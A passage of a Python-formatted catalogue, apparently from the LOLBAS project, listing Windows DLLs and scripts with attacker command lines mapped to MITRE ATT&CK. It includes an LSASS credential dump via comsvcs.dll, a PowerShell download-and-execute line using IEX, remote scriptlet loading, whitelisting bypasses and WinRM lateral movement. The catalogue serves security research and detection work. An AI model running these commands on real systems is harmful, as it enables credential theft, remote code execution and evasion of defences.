                    "Command": "rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 C:\\\\Tools\\\\calc_exe.inf",
                    "Description": "Launch an executable file via the InstallHinfSection function and .inf file section directive.",
                    "UseCase": "Load an executable payload.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1085",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1085",
                    "OperatingSystem": "Windows",
                },
            ],
            "Full_Path": [
                {"Path": "c:\\windows\\system32\\setupapi.dll"},
                {"Path": "c:\\windows\\syswow64\\setupapi.dll"},
            ],
            "Code_Sample": [
                {
                    "Code": "https://raw.githubusercontent.com/huntresslabs/evading-autoruns/master/shady.inf"
                },
                {
                    "Code": "https://gist.github.com/enigma0x3/469d82d1b7ecaf84f4fb9e6c392d25ba#file-backdoor-minimalist-sct"
                },
                {
                    "Code": "https://gist.githubusercontent.com/enigma0x3/469d82d1b7ecaf84f4fb9e6c392d25ba/raw/6cb52b88bcc929f5555cd302d9ed848b7e407052/Backdoor-Minimalist.sct"
                },
                {
                    "Code": "https://gist.githubusercontent.com/bohops/0cc6586f205f3691e04a1ebf1806aabd/raw/baf7b29891bb91e76198e30889fbf7d6642e8974/calc_exe.inf"
                },
            ],
            "Detection": [{"IOC": None}],
            "Resources": [
                {"Link": "https://github.com/huntresslabs/evading-autoruns"},
                {"Link": "https://twitter.com/pabraeken/status/994742106852941825"},
                {"Link": "https://windows10dll.nirsoft.net/setupapi_dll.html"},
            ],
            "Acknowledgement": [
                {
                    "Person": "Kyle Hanslovan (COM Scriptlet)",
                    "Handle": "AT_SYMBOLKyleHanslovan",
                },
                {
                    "Person": "Huntress Labs (COM Scriptlet)",
                    "Handle": "AT_SYMBOLHuntressLabs",
                },
                {"Person": "Casey Smith (COM Scriptlet)", "Handle": "AT_SYMBOLsubTee"},
                {
                    "Person": "Nick Carr (Threat Intel)",
                    "Handle": "AT_SYMBOLItsReallyNick",
                },
            ],
            "pname": "setupapi",
        },
        {
            "Name": "Pcwutl.dll",
            "Description": "Microsoft HTML Viewer",
            "Author": None,
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "rundll32.exe pcwutl.dll,LaunchApplication calc.exe",
                    "Description": "Launch executable by calling the LaunchApplication function.",
                    "UseCase": "Launch an executable.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1085",
                    "MItreLink": "https://attack.mitre.org/wiki/Technique/T1085",
                    "OperatingSystem": "Windows",
                }
            ],
            "Full_Path": [
                {"Path": "c:\\windows\\system32\\pcwutl.dll"},
                {"Path": "c:\\windows\\syswow64\\pcwutl.dll"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": None}],
            "Resources": [
                {"Link": "https://twitter.com/harr0ey/status/989617817849876488"},
                {"Link": "https://windows10dll.nirsoft.net/pcwutl_dll.html"},
            ],
            "Acknowledgement": [
                {"Person": "Matt harr0ey", "Handle": "AT_SYMBOLharr0ey"}
            ],
            "pname": "pcwutl",
        },
        {
            "Name": "Ieaframe.dll",
            "Description": "Internet Browser DLL for translating HTML code.",
            "Author": None,
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": 'rundll32.exe ieframe.dll,OpenURL "C:\\test\\calc.url"',
                    "Description": "Launch an executable payload via proxy through a(n) URL (information) file by calling OpenURL.",
                    "UseCase": "Load an executable payload by calling a .url file with or without quotes.  The .url file extension can be renamed.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1085",
                    "MItreLink": "https://attack.mitre.org/wiki/Technique/T1085",
                    "OperatingSystem": "Windows",
                }
            ],
            "Full_Path": [
                {"Path": "c:\\windows\\system32\\ieframe.dll"},
                {"Path": "c:\\windows\\syswow64\\ieframe.dll"},
            ],
            "Code_Sample": [
                {
                    "Code": "https://gist.githubusercontent.com/bohops/89d7b11fa32062cfe31be9fdb18f050e/raw/1206a613a6621da21e7fd164b80a7ff01c5b64ab/calc.url"
                }
            ],
            "Detection": [{"IOC": None}],
            "Resources": [
                {
                    "Link": "http://www.hexacorn.com/blog/2018/03/15/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline-part-5/"
                },
                {
                    "Link": "https://bohops.com/2018/03/17/abusing-exported-functions-and-exposed-dcom-interfaces-for-pass-thru-command-execution-and-lateral-movement/"
                },
                {"Link": "https://twitter.com/bohops/status/997690405092290561"},
                {"Link": "https://windows10dll.nirsoft.net/ieframe_dll.html"},
            ],
            "Acknowledgement": [
                {"Person": "Jimmy", "Handle": "AT_SYMBOLbohops"},
                {"Person": "Adam", "Handle": "AT_SYMBOLhexacorn"},
            ],
            "pname": "ieaframe",
        },
        {
            "Name": "Url.dll",
            "Description": "Internet Shortcut Shell Extension DLL.",
            "Author": None,
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": 'rundll32.exe url.dll,OpenURL "C:\\test\\calc.hta"',
                    "Description": "Launch a HTML application payload by calling OpenURL.",
                    "UseCase": "Invoke an HTML Application via mshta.exe (Default Handler).",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1085",
                    "MItreLink": "https://attack.mitre.org/wiki/Technique/T1085",
                    "OperatingSystem": "Windows",
                },
                {
                    "Command": 'rundll32.exe url.dll,OpenURL "C:\\test\\calc.url"',
                    "Description": "Launch an executable payload via proxy through a(n) URL (information) file by calling OpenURL.",
                    "UseCase": "Load an executable payload by calling a .url file with or without quotes.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1085",
                    "MItreLink": "https://attack.mitre.org/wiki/Technique/T1085",
                    "OperatingSystem": "Windows",
                },
                {
                    "Command": "rundll32.exe url.dll,OpenURL file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e",
                    "Description": "Launch an executable by calling OpenURL.",
                    "UseCase": "Load an executable payload by specifying the file protocol handler (obfuscated).",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1085",
                    "MItreLink": "https://attack.mitre.org/wiki/Technique/T1085",
                    "OperatingSystem": "Windows",
                },
                {
                    "Command": "rundll32.exe url.dll,FileProtocolHandler calc.exe",
                    "Description": "Launch an executable by calling FileProtocolHandler.",
                    "UseCase": "Launch an executable.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1085",
                    "MItreLink": "https://attack.mitre.org/wiki/Technique/T1085",
                    "OperatingSystem": "Windows",
                },
                {
                    "Command": "rundll32.exe url.dll,FileProtocolHandler file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e",
                    "Description": "Launch an executable by calling FileProtocolHandler.",
                    "UseCase": "Load an executable payload by specifying the file protocol handler (obfuscated).",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1085",
                    "MItreLink": "https://attack.mitre.org/wiki/Technique/T1085",
                    "OperatingSystem": "Windows",
                },
                {
                    "Command": "rundll32.exe url.dll,FileProtocolHandler file:///C:/test/test.hta",
                    "Description": "Launch a HTML application payload by calling FileProtocolHandler.",
                    "UseCase": "Invoke an HTML Application via mshta.exe (Default Handler).",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1085",
                    "MItreLink": "https://attack.mitre.org/wiki/Technique/T1085",
                    "OperatingSystem": "Windows",
                },
            ],
            "Full_Path": [
                {"Path": "c:\\windows\\system32\\url.dll"},
                {"Path": "c:\\windows\\syswow64\\url.dll"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": None}],
            "Resources": [
                {
                    "Link": "https://bohops.com/2018/03/17/abusing-exported-functions-and-exposed-dcom-interfaces-for-pass-thru-command-execution-and-lateral-movement/"
                },
                {
                    "Link": "https://twitter.com/DissectMalware/status/995348436353470465"
                },
                {"Link": "https://twitter.com/bohops/status/974043815655956481"},
                {"Link": "https://twitter.com/yeyint_mth/status/997355558070927360"},
                {"Link": "https://twitter.com/Hexacorn/status/974063407321223168"},
                {"Link": "https://windows10dll.nirsoft.net/url_dll.html"},
            ],
            "Acknowledgement": [
                {"Person": "Adam (OpenURL)", "Handle": "AT_SYMBOLhexacorn"},
                {"Person": "Jimmy (OpenURL)", "Handle": "AT_SYMBOLbohops"},
                {
                    "Person": "Malwrologist (FileProtocolHandler - HTA)",
                    "Handle": "AT_SYMBOLDissectMalware",
                },
                {"Person": "r0lan (Obfuscation)", "Handle": "AT_SYMBOLr0lan"},
            ],
            "pname": "url",
        },
        {
            "Name": "Ieadvpack.dll",
            "Description": "INF installer for Internet Explorer. Has much of the same functionality as advpack.dll.",
            "Author": None,
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "rundll32.exe ieadvpack.dll,LaunchINFSection c:\\test.inf,DefaultInstall_SingleUser,1,",
                    "Description": "Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).",
                    "UseCase": "Run local or remote script(let) code through INF file specification.",
                    "Category": "AWL Bypass",
                    "Privileges": "User",
                    "MitreID": "T1085",
                    "MItreLink": "https://attack.mitre.org/wiki/Technique/T1085",
                    "OperatingSystem": "Windows",
                },
                {
                    "Command": "rundll32.exe ieadvpack.dll,LaunchINFSection c:\\test.inf,,1,",
                    "Description": "Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (DefaultInstall section implied).",
                    "UseCase": "Run local or remote script(let) code through INF file specification.",
                    "Category": "AWL Bypass",
                    "Privileges": "User",
                    "MitreID": "T1085",
                    "MItreLink": "https://attack.mitre.org/wiki/Technique/T1085",
                    "OperatingSystem": "Windows",
                },
                {
                    "Command": "rundll32.exe ieadvpack.dll,RegisterOCX test.dll",
                    "Description": "Launch a DLL payload by calling the RegisterOCX function.",
                    "UseCase": "Load a DLL payload.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1085",
                    "MItreLink": "https://attack.mitre.org/wiki/Technique/T1085",
                    "OperatingSystem": "Windows",
                },
                {
                    "Command": "rundll32.exe ieadvpack.dll,RegisterOCX calc.exe",
                    "Description": "Launch an executable by calling the RegisterOCX function.",
                    "UseCase": "Run an executable payload.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1085",
                    "MItreLink": "https://attack.mitre.org/wiki/Technique/T1085",
                    "OperatingSystem": "Not specified",
                },
                {
                    "Command": 'rundll32 ieadvpack.dll, RegisterOCX "cmd.exe /c calc.exe"',
                    "Description": "Launch command line by calling the RegisterOCX function.",
                    "UseCase": "Run an executable payload.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1085",
                    "MItreLink": "https://attack.mitre.org/wiki/Technique/T1085",
                    "OperatingSystem": "Not specified",
                },
            ],
            "Full_Path": [
                {"Path": "c:\\windows\\system32\\ieadvpack.dll"},
                {"Path": "c:\\windows\\syswow64\\ieadvpack.dll"},
            ],
            "Code_Sample": [
                {
                    "Code": "https://github.com/LOLBAS-Project/LOLBAS-Project.github.io/blob/master/_lolbas/Libraries/Payload/Ieadvpack.inf"
                },
                {
                    "Code": "https://github.com/LOLBAS-Project/LOLBAS-Project.github.io/blob/master/_lolbas/Libraries/Payload/Ieadvpack_calc.sct"
                },
            ],
            "Detection": [{"IOC": None}],
            "Resources": [
                {
                    "Link": "https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/"
                },
                {"Link": "https://twitter.com/pabraeken/status/991695411902599168"},
                {"Link": "https://twitter.com/0rbz_/status/974472392012689408"},
            ],
            "Acknowledgement": [
                {"Person": "Jimmy (LaunchINFSection)", "Handle": "AT_SYMBOLbohops"},
                {"Person": "Fabrizio (RegisterOCX - DLL)", "Handle": "AT_SYMBOL0rbz_"},
                {
                    "Person": "Pierre-Alexandre Braeken (RegisterOCX - CMD)",
                    "Handle": "AT_SYMBOLpabraeken",
                },
            ],
            "pname": "ieadvpack",
        },
        {
            "Name": "Zipfldr.dll",
            "Description": "Compressed Folder library",
            "Author": None,
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "rundll32.exe zipfldr.dll,RouteTheCall calc.exe",
                    "Description": "Launch an executable payload by calling RouteTheCall.",
                    "UseCase": "Launch an executable.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1085",
                    "MItreLink": "https://attack.mitre.org/wiki/Technique/T1085",
                    "OperatingSystem": "Windows",
                },
                {
                    "Command": "rundll32.exe zipfldr.dll,RouteTheCall file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e",
                    "Description": "Launch an executable payload by calling RouteTheCall (obfuscated).",
                    "UseCase": "Launch an executable.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1085",
                    "MItreLink": "https://attack.mitre.org/wiki/Technique/T1085",
                    "OperatingSystem": "Windows",
                },
            ],
            "Full_Path": [
                {"Path": "c:\\windows\\system32\\zipfldr.dll"},
                {"Path": "c:\\windows\\syswow64\\zipfldr.dll"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": None}],
            "Resources": [
                {"Link": "https://twitter.com/moriarty_meng/status/977848311603380224"},
                {"Link": "https://twitter.com/bohops/status/997896811904929792"},
                {"Link": "https://windows10dll.nirsoft.net/zipfldr_dll.html"},
            ],
            "Acknowledgement": [
                {"Person": "Moriarty (Execution)", "Handle": "AT_SYMBOLmoriarty_meng"},
                {"Person": "r0lan (Obfuscation)", "Handle": "AT_SYMBOLr0lan"},
            ],
            "pname": "zipfldr",
        },
        {
            "Name": "Syssetup.dll",
            "Description": "Windows NT System Setup",
            "Author": None,
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 c:\\test\\shady.inf",
                    "Description": "Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).",
                    "UseCase": "Run local or remote script(let) code through INF file specification (Note May pop an error window).",
                    "Category": "AWL Bypass",
                    "Privileges": "User",
                    "MitreID": "T1085",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1085",
                    "OperatingSystem": "Windows",
                },
                {
                    "Command": "rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 c:\\temp\\something.inf",
                    "Description": "Launch an executable file via the SetupInfObjectInstallAction function and .inf file section directive.",
                    "UseCase": "Load an executable payload.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1085",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1085",
                    "OperatingSystem": "Windows",
                },
            ],
            "Full_Path": [
                {"Path": "c:\\windows\\system32\\syssetup.dll"},
                {"Path": "c:\\windows\\syswow64\\syssetup.dll"},
            ],
            "Code_Sample": [
                {
                    "Code": "https://raw.githubusercontent.com/huntresslabs/evading-autoruns/master/shady.inf"
                },
                {
                    "Code": "https://gist.github.com/enigma0x3/469d82d1b7ecaf84f4fb9e6c392d25ba#file-backdoor-minimalist-sct"
                },
                {
                    "Code": "https://gist.github.com/homjxi0e/87b29da0d4f504cb675bb1140a931415"
                },
            ],
            "Detection": [{"IOC": None}],
            "Resources": [
                {"Link": "https://twitter.com/pabraeken/status/994392481927258113"},
                {"Link": "https://twitter.com/harr0ey/status/975350238184697857"},
                {"Link": "https://twitter.com/bohops/status/975549525938135040"},
                {"Link": "https://windows10dll.nirsoft.net/syssetup_dll.html"},
            ],
            "Acknowledgement": [
                {
                    "Person": "Pierre-Alexandre Braeken (Execute)",
                    "Handle": "AT_SYMBOLpabraeken",
                },
                {"Person": "Matt harr0ey (Execute)", "Handle": "AT_SYMBOLharr0ey"},
                {"Person": "Jimmy (Scriptlet)", "Handle": "AT_SYMBOLbohops"},
            ],
            "pname": "syssetup",
        },
        {
            "Name": "Mshtml.dll",
            "Description": "Microsoft HTML Viewer",
            "Author": None,
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": 'rundll32.exe Mshtml.dll,PrintHTML "C:\\temp\\calc.hta"',
                    "Description": "Invoke an HTML Application via mshta.exe (Note - Pops a security warning and a print dialogue box).",
                    "UseCase": "Launch an HTA application.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1085",
                    "MItreLink": "https://attack.mitre.org/wiki/Technique/T1085",
                    "OperatingSystem": "Windows",
                }
            ],
            "Full_Path": [
                {"Path": "c:\\windows\\system32\\mshtml.dll"},
                {"Path": "c:\\windows\\syswow64\\mshtml.dll"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": None}],
            "Resources": [
                {"Link": "https://twitter.com/pabraeken/status/998567549670477824"},
                {"Link": "https://windows10dll.nirsoft.net/mshtml_dll.html"},
            ],
            "Acknowledgement": [
                {"Person": "Pierre-Alexandre Braeken", "Handle": "AT_SYMBOLpabraeken"}
            ],
            "pname": "mshtml",
        },
        {
            "Name": "Shdocvw.dll",
            "Description": "Shell Doc Object and Control Library.",
            "Author": None,
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": 'rundll32.exe shdocvw.dll,OpenURL "C:\\test\\calc.url"',
                    "Description": "Launch an executable payload via proxy through a(n) URL (information) file by calling OpenURL.",
                    "UseCase": "Load an executable payload by calling a .url file with or without quotes.  The .url file extension can be renamed.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1085",
                    "MItreLink": "https://attack.mitre.org/wiki/Technique/T1085",
                    "OperatingSystem": "Windows",
                }
            ],
            "Full_Path": [
                {"Path": "c:\\windows\\system32\\shdocvw.dll"},
                {"Path": "c:\\windows\\syswow64\\shdocvw.dll"},
            ],
            "Code_Sample": [
                {
                    "Code": "https://gist.githubusercontent.com/bohops/89d7b11fa32062cfe31be9fdb18f050e/raw/1206a613a6621da21e7fd164b80a7ff01c5b64ab/calc.url"
                }
            ],
            "Detection": [{"IOC": None}],
            "Resources": [
                {
                    "Link": "http://www.hexacorn.com/blog/2018/03/15/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline-part-5/"
                },
                {
                    "Link": "https://bohops.com/2018/03/17/abusing-exported-functions-and-exposed-dcom-interfaces-for-pass-thru-command-execution-and-lateral-movement/"
                },
                {"Link": "https://twitter.com/bohops/status/997690405092290561"},
                {"Link": "https://windows10dll.nirsoft.net/shdocvw_dll.html"},
            ],
            "Acknowledgement": [
                {"Person": "Adam", "Handle": "AT_SYMBOLhexacorn"},
                {"Person": "Jimmy", "Handle": "AT_SYMBOLbohops"},
            ],
            "pname": "shdocvw",
        },
        {
            "Name": "Comsvcs.dll",
            "Description": "COM+ Services",
            "Author": None,
            "Created": "2019-08-30",
            "Commands": [
                {
                    "Command": 'rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump "[LSASS_PID] dump.bin full"',
                    "Description": "Calls the MiniDump exported function of comsvcs.dll, which in turns calls MiniDumpWriteDump.",
                    "Usecase": "Dump Lsass.exe process memory to retrieve credentials.",
                    "Category": "Dump",
                    "Privileges": "SYSTEM",
                    "MitreID": "T1003",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1003",
                    "OperatingSystem": "Windows",
                }
            ],
            "Full_Path": [{"Path": "c:\\windows\\system32\\comsvcs.dll"}],
            "Code_Sample": [
                {
                    "Code": "https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/"
                }
            ],
            "Detection": [{"IOC": "MiniDump being used in library"}],
            "Resources": [
                {
                    "Link": "https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/"
                }
            ],
            "Acknowledgement": [{"Person": "modexp", "Handle": "NA"}],
            "pname": "comsvcs",
        },
        {
            "Name": "Advpack.dll",
            "Description": "Utility for installing software and drivers with rundll32.exe",
            "Author": None,
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "rundll32.exe advpack.dll,LaunchINFSection c:\\test.inf,DefaultInstall_SingleUser,1,",
                    "Description": "Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).",
                    "UseCase": "Run local or remote script(let) code through INF file specification.",
                    "Category": "AWL Bypass",
                    "Privileges": "User",
                    "MitreID": "T1085",
                    "MItreLink": "https://attack.mitre.org/wiki/Technique/T1085",
                    "OperatingSystem": "Windows",
                },
                {
                    "Command": "rundll32.exe advpack.dll,LaunchINFSection c:\\test.inf,,1,",
                    "Description": "Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (DefaultInstall section implied).",
                    "UseCase": "Run local or remote script(let) code through INF file specification.",
                    "Category": "AWL Bypass",
                    "Privileges": "User",
                    "MitreID": "T1085",
                    "MItreLink": "https://attack.mitre.org/wiki/Technique/T1085",
                    "OperatingSystem": "Windows",
                },
                {
                    "Command": "rundll32.exe advpack.dll,RegisterOCX test.dll",
                    "Description": "Launch a DLL payload by calling the RegisterOCX function.",
                    "UseCase": "Load a DLL payload.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1085",
                    "MItreLink": "https://attack.mitre.org/wiki/Technique/T1085",
                    "OperatingSystem": "Windows",
                },
                {
                    "Command": "rundll32.exe advpack.dll,RegisterOCX calc.exe",
                    "Description": "Launch an executable by calling the RegisterOCX function.",
                    "UseCase": "Run an executable payload.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1085",
                    "MItreLink": "https://attack.mitre.org/wiki/Technique/T1085",
                    "OperatingSystem": "Not specified",
                },
                {
                    "Command": 'rundll32 advpack.dll, RegisterOCX "cmd.exe /c calc.exe"',
                    "Description": "Launch command line by calling the RegisterOCX function.",
                    "UseCase": "Run an executable payload.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1085",
                    "MItreLink": "https://attack.mitre.org/wiki/Technique/T1085",
                    "OperatingSystem": "Not specified",
                },
            ],
            "Full_Path": [
                {"Path": "c:\\windows\\system32\\advpack.dll"},
                {"Path": "c:\\windows\\syswow64\\advpack.dll"},
            ],
            "Code_Sample": [
                {
                    "Code": "https://github.com/LOLBAS-Project/LOLBAS-Project.github.io/blob/master/_lolbas/Libraries/Payload/Advpack.inf"
                },
                {
                    "Code": "https://github.com/LOLBAS-Project/LOLBAS-Project.github.io/blob/master/_lolbas/Libraries/Payload/Advpack_calc.sct"
                },
            ],
            "Detection": [{"IOC": None}],
            "Resources": [
                {
                    "Link": "https://bohops.com/2018/02/26/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence/"
                },
                {"Link": "https://twitter.com/ItsReallyNick/status/967859147977850880"},
                {"Link": "https://twitter.com/bohops/status/974497123101179904"},
                {"Link": "https://twitter.com/moriarty_meng/status/977848311603380224"},
            ],
            "Acknowledegment": [
                {"Person": "Jimmy (LaunchINFSection)", "Handle": "AT_SYMBOLbohops"},
                {"Person": "Fabrizio (RegisterOCX - DLL)", "Handle": "AT_SYMBOL0rbz_"},
                {
                    "Person": "Moriarty (RegisterOCX - CMD)",
                    "Handle": "AT_SYMBOLmoriarty_meng",
                },
                {
                    "Person": "Nick Carr (Threat Intel)",
                    "Handle": "AT_SYMBOLItsReallyNick",
                },
            ],
            "pname": "advpack",
        },
    ],
    "Scripts": [
        {
            "Name": "Pubprn.vbs",
            "Description": None,
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "pubprn.vbs 127.0.0.1 script:https://domain.com/folder/file.sct",
                    "Description": "Set the 2nd variable with a Script COM moniker to perform Windows Script Host (WSH) Injection",
                    "Usecase": "Proxy execution",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1216",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1216",
                    "OperatingSystem": "Windows 10",
                }
            ],
            "Full_Path": [
                {
                    "Path": "C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs"
                },
                {
                    "Path": "C:\\Windows\\SysWOW64\\Printing_Admin_Scripts\\en-US\\pubprn.vbs"
                },
            ],
            "Code_Sample": [
                {
                    "Code": "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSScripts/Payload/Pubprn_calc.sct"
                }
            ],
            "Detection": [{"IOC": None}],
            "Resources": [
                {
                    "Link": "https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/"
                },
                {
                    "Link": "https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology"
                },
                {
                    "Link": "https://github.com/enigma0x3/windows-operating-system-archaeology"
                },
            ],
            "Acknowledgement": [
                {"Person": "Matt Nelson", "Handle": "AT_SYMBOLenigma0x3"}
            ],
            "pname": "pubprn",
        },
        {
            "Name": "Slmgr.vbs",
            "Description": "Script used to manage windows license activation",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "reg.exe import c:\\path\\to\\Slmgr.reg & cscript.exe /b c:\\windows\\system32\\slmgr.vbs",
                    "Description": "Hijack the Scripting.Dictionary COM Object to execute remote scriptlet (SCT) code",
                    "Usecase": "Proxy execution",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1216",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1216",
                    "OperatingSystem": "Windows 10",
                }
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\slmgr.vbs"},
                {"Path": "C:\\Windows\\SysWOW64\\slmgr.vbs"},
            ],
            "Code_Sample": [
                {
                    "Code": "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSScripts/Payload/Slmgr_calc.sct"
                },
                {
                    "Code": "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSScripts/Payload/Slmgr.reg"
                },
            ],
            "Detection": [{"IOC": None}],
            "Resources": [
                {
                    "Link": "https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology"
                },
                {"Link": "https://www.youtube.com/watch?v=3gz1QmiMhss"},
            ],
            "Acknowledgement": [
                {"Person": "Matt Nelson", "Handle": "AT_SYMBOLenigma0x3"},
                {"Person": "Casey Smith", "Handle": "AT_SYMBOLsubtee"},
            ],
            "pname": "slmgr",
        },
        {
            "Name": "Syncappvpublishingserver.vbs",
            "Description": "Script used related to app-v and publishing server",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "SyncAppvPublishingServer.vbs \"n;((New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX\"",
                    "Description": "Inject PowerShell script code with the provided arguments",
                    "Usecase": "Use Powershell host invoked from vbs script",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1216",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1216",
                    "OperatingSystem": "Windows 10",
                }
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\SyncAppvPublishingServer.vbs"}
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": None}],
            "Resources": [
                {"Link": "https://twitter.com/monoxgas/status/895045566090010624"},
                {"Link": "https://twitter.com/subTee/status/855738126882316288"},
            ],
            "Acknowledgement": [
                {"Person": "Nick Landers", "Handle": "AT_SYMBOLmonoxgas"},
                {"Person": "Casey Smith", "Handle": "AT_SYMBOLsubtee"},
            ],
            "pname": "syncappvpublishingserver",
        },
        {
            "Name": "winrm.vbs",
            "Description": "Script used for manage Windows RM settings",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": 'winrm invoke Create wmicimv2/Win32_Process AT_SYMBOL{CommandLine="notepad.exe"} -r:http://target:5985',
                    "Description": "Lateral movement/Remote Command Execution via WMI Win32_Process class over the WinRM protocol",
                    "Usecase": "Proxy execution",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1216",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1216",
                    "OperatingSystem": "Windows 10",
                },
                {
                    "Command": 'winrm invoke Create wmicimv2/Win32_Service AT_SYMBOL{Name="Evil";DisplayName="Evil";PathName="cmd.exe /k c:\\windows\\system32\\notepad.exe"} -r:http://acmedc:5985   \\nwinrm invoke StartService wmicimv2/Win32_Service?Name=Evil -r:http://acmedc:5985',
                    "Description": "Lateral movement/Remote Command Execution via WMI Win32_Service class over the WinRM protocol",
                    "Usecase": "Proxy execution",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1216",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1216",
                    "OperatingSystem": "Windows 10",
                },
                {
                    "Command": "%SystemDrive%\\BypassDir\\cscript //nologo %windir%\\System32\\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty",
                    "Description": "Bypass AWL solutions by copying and executing cscript.exe and malicious XSL documents from attacker controlled location",
                    "Usecase": "Execute aribtrary, unsigned code via XSL script",
                    "Category": "AWL Bypass",
                    "Privileges": "User",
                    "MitreID": "T1216",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1216",
                    "OperatingSystem": "Windows 10",
                },
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\winrm.vbs"},
                {"Path": "C:\\Windows\\SysWOW64\\winrm.vbs"},
            ],
            "Code_Sample": [
                {
                    "Code": "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSScripts/Payload/Slmgr.reg"
                },
                {
                    "Code": "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSScripts/Payload/Slmgr_calc.sct"
                },
            ],
            "Detection": [{"IOC": None}],
            "Resources": [
                {
                    "Link": "https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology"
                },
                {"Link": "https://www.youtube.com/watch?v=3gz1QmiMhss"},
                {
                    "Link": "https://github.com/enigma0x3/windows-operating-system-archaeology"
                },
                {"Link": "https://redcanary.com/blog/lateral-movement-winrm-wmi/"},
